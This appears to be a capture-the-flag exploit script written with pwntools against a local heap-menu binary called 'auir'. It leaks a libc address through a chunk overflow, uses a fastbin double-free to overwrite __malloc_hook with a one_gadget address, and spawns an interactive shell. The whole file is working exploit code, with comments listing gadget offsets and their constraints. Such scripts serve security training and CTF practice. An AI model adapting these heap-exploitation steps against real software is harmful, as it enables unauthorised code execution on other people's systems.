from pwn import *

#Establish the functions to interact with the elf
def alloc(size, content):
    p.recvuntil(">>")
    p.sendline('1')
    p.recvuntil(">>")
    p.sendline(str(size) if size != -1 else str(len(content)))
    p.recvuntil(">>")
    p.send(content)

def free(index):
    p.recvuntil(">>")
    p.sendline('2')
    p.recvuntil(">>")
    p.sendline(str(index))

def fix(index, size, content):
    p.recvuntil(">>")
    p.sendline('3')
    p.recvuntil(">>")
    p.sendline(str(index))
    p.recvuntil(">>")
    p.sendline(str(size) if size != -1 else str(len(content)))
    p.recvuntil(">>")
    p.send(content)

def show(index):
    p.recvuntil(">>")
    p.sendline('4')
    p.recvuntil(">>")
    p.sendline(str(index))


env = {}
# env["LD_PRELOAD"] = "./libc-2.23.so"
elf = context.binary = ELF("./auir")
p = process(env=env)
libc = elf.libc



# LEAK LIBC ADDR
alloc(0x80,b"0" * 0x80) # 0
alloc(0x10,b"1" * 0x10) # 1
alloc(0x90,b"2" * 0x90) # 2
alloc(0x90,b"3" * 0x90) # 3
alloc(0x10,b"4" * 0x10) # 4

free(0)
free(2)
alloc(0x90,b"UR MOM") # 5
fix(2,-1,b"2" * 0x90 + p64(0xa0 + 0x20 + 0x90) + p64(0xa0)) # overflow from 0 into 3
free(3)
alloc(0x88,b"0" * 0x88) # 6

show(1)
p.recvuntil("....\n")
LEAK = p.recv(6) # main_arena + 88 (__malloc_hook = main_arena + 68)
LEAK = u64( LEAK + b"\x00" * (8 - len(LEAK))) 
libc.address = LEAK - 0x3c4b78 
print("LEAK: ",hex(LEAK))
print("LIBC ADDRESS: ", hex(libc.address))


# FASTBIN ATTACK: write one_gadget into the hook
alloc(0x60,b"7" * 0x60) # 7 and 0
alloc(0x60,b"8" * 0x60) # 8
free(7)
free(8)
free(7)
alloc(0x60,p64(libc.sym["__malloc_hook"] - 0x23))
alloc(0x60,b"A") 
alloc(0x60,b"A") 


# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL
# 
# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
# 
# 0xf0274 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
# 
# 0xf1117 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
ONE_GADGET = libc.address + 0xf1117
print("ONE_GADGET:" ,hex(ONE_GADGET))
print("FAKE :" ,hex(libc.sym["__malloc_hook"] - 0x23))
alloc(0x60,0x13 * b"A" + p64(ONE_GADGET)) 
# gdb.attach(p,f"b *{ONE_GADGET}")

free(9)

p.interactive()